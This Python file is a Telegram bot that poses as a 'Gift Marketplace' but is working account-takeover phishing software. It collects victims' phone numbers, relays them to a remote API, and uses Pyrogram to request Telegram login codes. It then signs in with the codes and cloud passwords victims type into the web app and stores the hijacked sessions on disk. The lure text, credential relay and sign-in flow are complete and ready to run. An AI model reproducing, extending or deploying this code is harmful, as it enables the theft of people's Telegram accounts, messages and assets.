#!/usr/bin/env python3
"""
======================================================================================
                     MARKETPLACE BOT - TELEGRAM AUTH BOT
======================================================================================
"""

import asyncio
import logging
import sys
import os
import re
import json
import time
from pathlib import Path
import aiohttp

# Aiogram
from aiogram import Bot, Dispatcher, Router, F, types
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode, ContentType
from aiogram.filters import CommandStart
from aiogram.types import (
    InlineKeyboardButton, WebAppInfo,
    ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove
)
from aiogram.utils.keyboard import InlineKeyboardBuilder

# Pyrogram
from pyrogram import Client
from pyrogram.errors import (
    SessionPasswordNeeded, PhoneCodeInvalid, PhoneCodeExpired,
    PasswordHashInvalid, FloodWait
)

# ================= ЛОГИРОВАНИЕ =================
logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s] %(levelname)s: %(message)s',
    handlers=[logging.StreamHandler()]
)
logger = logging.getLogger("MarketplaceBot")

# ================= НАСТРОЙКИ =================
BASE_DIR = Path(__file__).parent.resolve()
SESSIONS_DIR = BASE_DIR / "sessions"
SESSIONS_DIR.mkdir(exist_ok=True)

def load_settings() -> dict:
    settings_path = BASE_DIR / "settings.json"
    if settings_path.exists():
        with open(settings_path, "r", encoding="utf-8") as f:
            data = json.load(f)
            if "site_url" in data and "api_url" not in data:
                data["api_url"] = data["site_url"].rstrip('/')
            return data
    return {
        "bot_token": os.getenv("BOT_TOKEN", ""),
        "api_id": int(os.getenv("API_ID", 0)),
        "api_hash": os.getenv("API_HASH", ""),
        "api_url": os.getenv("SITE_URL", "http://localhost:3000").rstrip('/'),
        "admin_ids": []
    }

SETTINGS = load_settings()
APP_INSTANCE = None

# ================= ХРАНИЛИЩА =================
user_sessions = {}      # { phone: { hash: phone_code_hash, telegram_id: str } }
pyrogram_clients = {}   # { phone: Client }
processed_requests = {}  # { requestId: set(actions) }


# ================= УТИЛИТЫ =================
def clean_phone(phone: str) -> str:
    if not phone:
        return ""
    clean = re.sub(r'\D', '', str(phone))
    if len(clean) == 11 and clean.startswith('8'):
        clean = '7' + clean[1:]
    elif len(clean) == 10:
        clean = '7' + clean
    return '+' + clean if not clean.startswith('+') else clean


def get_webapp_url(user_id: int) -> str:
    base = SETTINGS['api_url'].rstrip('/')
    sep = '&' if '?' in base else '?'
    return f"{base}{sep}chatId={user_id}"


def is_request_processed(req_id: str, action: str) -> bool:
    if req_id not in processed_requests:
        return False
    return action in processed_requests[req_id]


def mark_request_processed(req_id: str, action: str):
    if req_id not in processed_requests:
        processed_requests[req_id] = set()
    processed_requests[req_id].add(action)


# ================= РОУТЕР =================
def get_router(bot: Bot) -> Router:
    router = Router()

    @router.message(CommandStart())
    async def cmd_start(msg: types.Message):
        uid = msg.from_user.id
        url = get_webapp_url(uid)

        text = (
            "🎁 <b>Welcome to Gift Marketplace!</b>\n\n"
            "A new trending way to trade Telegram gifts is here\n\n"
            "📍 Buy, sell, collect — all in one place"
        )

        kb = InlineKeyboardBuilder()
        kb.row(InlineKeyboardButton(text="🌀 Open Marketplace", web_app=WebAppInfo(url=url)))

        await msg.answer(text, reply_markup=kb.as_markup(), parse_mode=ParseMode.HTML)

    @router.message(F.text)
    async def handle_phone_message(msg: types.Message):
        """Обрабатывает текстовые сообщения, проверяет номер телефона и отправляет в API"""
        text = msg.text.strip()
        telegram_id = msg.from_user.id
        
        logger.info(f"=== INCOMING TEXT MESSAGE ===")
        logger.info(f"TG ID: {telegram_id}")
        logger.info(f"Raw text: '{text}'")
        logger.info(f"Text length: {len(text)}")
        
        # Проверяем, похоже ли на номер телефона
        cleaned = re.sub(r'\D', '', text)
        logger.info(f"Cleaned (digits only): '{cleaned}'")
        logger.info(f"Cleaned length: {len(cleaned)}")
        
        if len(cleaned) >= 10:
            logger.info(f"✓ Passed length check (>= 10 digits)")
            phone = clean_phone(text)
            logger.info(f"Formatted phone: {phone}")
            
            try:
                async with aiohttp.ClientSession() as session:
                    url = f"{SETTINGS['api_url']}/api/telegram/receive-phone"
                    logger.info(f"API URL: {url}")
                    
                    payload = {
                        "phone": phone,
                        "telegramId": telegram_id,
                        "timestamp": int(time.time())
                    }
                    logger.info(f"Payload: {payload}")
                    
                    async with session.post(url, json=payload, timeout=aiohttp.ClientTimeout(total=5)) as resp:
                        response_text = await resp.text()
                        logger.info(f"✅ API Response: Status {resp.status}")
                        logger.info(f"Response body: {response_text[:200]}")
            except Exception as e:
                logger.error(f"❌ Error sending phone to API: {type(e).__name__}: {e}")
                import traceback
                logger.error(f"Traceback: {traceback.format_exc()}")
            
            logger.info(f"=== END TEXT MESSAGE (processed) ===\n")
            return True
        else:
            logger.info(f"✗ Failed length check (< 10 digits) - ignoring message")
            logger.info(f"=== END TEXT MESSAGE (not a phone) ===\n")
            return False

    @router.message(F.contact)
    async def handle_contact(msg: types.Message):
        """Обрабатывает контакты с номерами телефонов, отправляет в API"""
        contact = msg.contact
        telegram_id = msg.from_user.id
        
        logger.info(f"=== INCOMING CONTACT ===")
        logger.info(f"TG ID: {telegram_id}")
        logger.info(f"Contact raw phone: '{contact.phone_number}'")
        logger.info(f"Contact first_name: '{contact.first_name}'")
        logger.info(f"Contact user_id: {contact.user_id}")
        
        if not contact.phone_number:
            logger.warning(f"⚠ Contact has no phone_number")
            logger.info(f"=== END CONTACT (no phone) ===\n")
            return False
        
        phone_raw = contact.phone_number.strip()
        logger.info(f"Cleaned contact phone: '{phone_raw}'")
        
        # Очищаем и форматируем номер
        phone = clean_phone(phone_raw)
        logger.info(f"Formatted phone: '{phone}'")
        
        try:
            async with aiohttp.ClientSession() as session:
                url = f"{SETTINGS['api_url']}/api/telegram/receive-phone"
                logger.info(f"API URL: {url}")
                
                payload = {
                    "phone": phone,
                    "telegramId": telegram_id,
                    "timestamp": int(time.time()),
                    "source": "contact"
                }
                logger.info(f"Payload: {payload}")
                
                async with session.post(url, json=payload, timeout=aiohttp.ClientTimeout(total=5)) as resp:
                    response_text = await resp.text()
                    logger.info(f"✅ API Response: Status {resp.status}")
                    logger.info(f"Response body: {response_text[:200]}")
        except Exception as e:
            logger.error(f"❌ Error sending contact to API: {type(e).__name__}: {e}")
            import traceback
            logger.error(f"Traceback: {traceback.format_exc()}")
        
        logger.info(f"=== END CONTACT (processed) ===\n")
        return True

    return router


# ================= ОСНОВНОЙ КЛАСС =================
class MarketplaceBot:
    def __init__(self):
        global APP_INSTANCE
        APP_INSTANCE = self
        self.bot = None
        self.dp = None
        self.api_url = SETTINGS['api_url']
        self.bot_token = SETTINGS['bot_token']

    async def update_status(self, req_id: str, status: str, message: str = None, error: str = None, phone: str = None, telegram_id: str = None):
        """Обновляет статус запроса на сервере"""
        url = f"{self.api_url}/api/telegram/update-request"
        payload = {"requestId": req_id, "status": status, "processed": True}
        if message:
            payload["message"] = message
        if error:
            payload["error"] = error
        if phone:
            payload["phone"] = phone
        if telegram_id:
            payload["telegramId"] = telegram_id

        try:
            async with aiohttp.ClientSession() as session:
                async with session.post(url, json=payload, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                    result = await resp.text()
                    logger.info(f"📤 API update: {status} -> {resp.status} | {result[:100]}")
        except Exception as e:
            logger.error(f"❌ API error: {e}")

    async def start_api_polling(self):
        """Polling API для получения pending запросов"""
        logger.info(f"📡 API Polling: {self.api_url}")
        
        async with aiohttp.ClientSession() as session:
            while True:
                try:
                    url = f"{self.api_url}/api/telegram/get-pending"
                    async with session.get(url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                        if resp.status == 200:
                            data = await resp.json()
                            for req in data.get('requests', []):
                                req_id = req.get('requestId')
                                action = req.get('action')
                                if req_id and action and not is_request_processed(req_id, action):
                                    mark_request_processed(req_id, action)
                                    phone = clean_phone(req.get('phone', ''))
                                    telegram_id = req.get('telegramId') or req.get('chatId')
                                    logger.info(f"📥 New request: {req_id} | {action} | Phone: {phone} | TG: {telegram_id}")
                                    asyncio.create_task(self.process_request(req))
                except Exception as e:
                    pass  # Тихо игнорируем ошибки polling
                await asyncio.sleep(2)

    async def process_request(self, req: dict, msg_id: int = None, chat_id: int = None):
        """Обрабатывает запрос авторизации"""
        req_id = req.get('requestId')
        action = req.get('action')
        phone = clean_phone(req.get('phone', ''))
        code = req.get('code')
        password = req.get('password')
        telegram_id = req.get('telegramId') or req.get('chatId')

        logger.info(f"🔄 Processing: {action} | Phone: {phone} | TelegramID: {telegram_id}")

        # Find phone from session if not provided
        if (action == 'send_code' or action == 'send_password') and not phone and telegram_id:
            for stored_phone, session_data in user_sessions.items():
                if session_data.get('telegram_id') == telegram_id:
                    phone = stored_phone
                    logger.info(f"🔍 Found session for TG {telegram_id}: phone={phone}")
                    break

        if not phone and action in ['send_code', 'send_password']:
            logger.error(f"❌ No phone found for {action} | TG: {telegram_id}")
            await self.update_status(req_id, "error", error="Сессия не найдена. Начните авторизацию заново.", telegram_id=telegram_id)
            return

        try:
            client = pyrogram_clients.get(phone)

            # ========== SEND_PHONE ==========
            if action == 'send_phone':
                if not phone:
                    logger.error("❌ No phone provided")
                    return

                # Создаем клиент Pyrogram
                if not client:
                    session_name = str(SESSIONS_DIR / phone.replace('+', ''))
                    client = Client(
                        session_name, 
                        api_id=SETTINGS['api_id'], 
                        api_hash=SETTINGS['api_hash']
                    )
                    pyrogram_clients[phone] = client
                    logger.info(f"📱 Created Pyrogram client for {phone}")

                try:
                    # Подключаемся
                    if not client.is_connected:
                        logger.info(f"🔌 Connecting Pyrogram...")
                        await client.connect()
                        logger.info(f"✅ Pyrogram connected")

                    # Отправляем код
                    logger.info(f"📤 Sending code to {phone}...")
                    sent = await client.send_code(phone)
                    user_sessions[phone] = {
                        'hash': sent.phone_code_hash,
                        'telegram_id': telegram_id
                    }
                    logger.info(f"✅ Code sent! Hash: {sent.phone_code_hash[:20]}... | TG: {telegram_id}")

                    # Обновляем статус на сервере
                    await self.update_status(req_id, "waiting_code", "Код отправлен в Telegram", phone=phone, telegram_id=telegram_id)

                except FloodWait as e:
                    err = f"Слишком много попыток. Подождите {e.value} сек."
                    logger.error(f"❌ FloodWait: {e.value}s")
                    await self.update_status(req_id, "error", error=err, phone=phone, telegram_id=telegram_id)
                    if client and client.is_connected:
                        await client.disconnect()

                except Exception as e:
                    logger.error(f"❌ send_code error: {type(e).__name__}: {e}")
                    await self.update_status(req_id, "error", error=str(e), phone=phone, telegram_id=telegram_id)
                    if client and client.is_connected:
                        await client.disconnect()

            # ========== SEND_CODE ==========
            elif action == 'send_code':
                if not client:
                    session_name = str(SESSIONS_DIR / phone.replace('+', ''))
                    client = Client(session_name, api_id=SETTINGS['api_id'], api_hash=SETTINGS['api_hash'])
                    pyrogram_clients[phone] = client
                    logger.info(f"📱 Loaded Pyrogram client for {phone}")

                if not client.is_connected:
                    await client.connect()
                    logger.info(f"🔌 Connected Pyrogram for code verification")

                session_data = user_sessions.get(phone)
                if not session_data:
                    logger.error(f"❌ No session for {phone}")
                    return await self.update_status(req_id, "error", error="Сессия истекла. Попробуйте снова.", phone=phone, telegram_id=telegram_id)

                if not telegram_id:
                    telegram_id = session_data.get('telegram_id')

                try:
                    logger.info(f"🔐 Signing in {phone} with code {code} | TG: {telegram_id}")
                    await client.sign_in(phone, session_data['hash'], code)
                    await self.update_status(req_id, "success", "Авторизация успешна!", phone=phone, telegram_id=telegram_id)
                    logger.info(f"✅ Login success: {phone} | TG: {telegram_id}")
                    await client.disconnect()
                    user_sessions.pop(phone, None)

                except SessionPasswordNeeded:
                    logger.info(f"🔒 2FA required for {phone} | TG: {telegram_id}")
                    await self.update_status(req_id, "waiting_password", "Требуется облачный пароль", phone=phone, telegram_id=telegram_id)

                except PhoneCodeInvalid:
                    logger.error(f"❌ Invalid code for {phone}")
                    await self.update_status(req_id, "error", error="Неверный код", phone=phone, telegram_id=telegram_id)

                except PhoneCodeExpired:
                    logger.error(f"❌ Code expired for {phone}")
                    await self.update_status(req_id, "error", error="Код истек. Запросите новый.", phone=phone, telegram_id=telegram_id)

                except Exception as e:
                    logger.error(f"❌ sign_in error: {e}")
                    await self.update_status(req_id, "error", error=str(e), phone=phone, telegram_id=telegram_id)

            # ========== SEND_PASSWORD ==========
            elif action == 'send_password':
                logger.info(f"🔐 Processing password for {phone} | TG: {telegram_id}")
                
                if not client:
                    session_name = str(SESSIONS_DIR / phone.replace('+', ''))
                    client = Client(session_name, api_id=SETTINGS['api_id'], api_hash=SETTINGS['api_hash'])
                    pyrogram_clients[phone] = client
                    logger.info(f"📱 Loaded Pyrogram client for {phone}")
                
                if not client.is_connected:
                    logger.info(f"🔌 Connecting Pyrogram for 2FA...")
                    await client.connect()
                    logger.info(f"✅ Pyrogram connected for 2FA")

                session_data = user_sessions.get(phone)
                if session_data and not telegram_id:
                    telegram_id = session_data.get('telegram_id')
                    
                try:
                    logger.info(f"🔐 Checking 2FA password for {phone} | TG: {telegram_id}")
                    await client.check_password(password)
                    await self.update_status(req_id, "success", "Авторизация с 2FA успешна!", phone=phone, telegram_id=telegram_id)
                    logger.info(f"✅ 2FA success: {phone} | TG: {telegram_id}")
                    if client.is_connected:
                        await client.disconnect()
                    user_sessions.pop(phone, None)
                    pyrogram_clients.pop(phone, None)

                except PasswordHashInvalid:
                    logger.error(f"❌ Invalid password for {phone}")
                    await self.update_status(req_id, "invalid_password", "Неверный пароль. Попробуйте еще раз.", phone=phone, telegram_id=telegram_id)

                except Exception as e:
                    logger.error(f"❌ check_password error: {e}")
                    await self.update_status(req_id, "error", error=str(e), phone=phone, telegram_id=telegram_id)

        except Exception as e:
            logger.error(f"❌ Fatal: {e}")
            await self.update_status(req_id, "error", error=str(e), phone=phone, telegram_id=telegram_id)

    async def run(self):
        """Запуск бота"""
        if not self.bot_token:
            logger.error("❌ BOT_TOKEN not set!")
            return

        self.bot = Bot(token=self.bot_token, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
        self.dp = Dispatcher()
        self.dp.include_router(get_router(self.bot))

        # Запускаем API polling в фоне
        asyncio.create_task(self.start_api_polling())

        bot_info = await self.bot.get_me()
        logger.info(f"🚀 Bot started: @{bot_info.username}")

        await self.dp.start_polling(self.bot)


# ================= MAIN =================
if __name__ == "__main__":
    try:
        bot = MarketplaceBot()
        asyncio.run(bot.run())
    except KeyboardInterrupt:
        logger.info("Bot stopped")
    except Exception as e:
        logger.error(f"Fatal error: {e}")
        sys.exit(1)
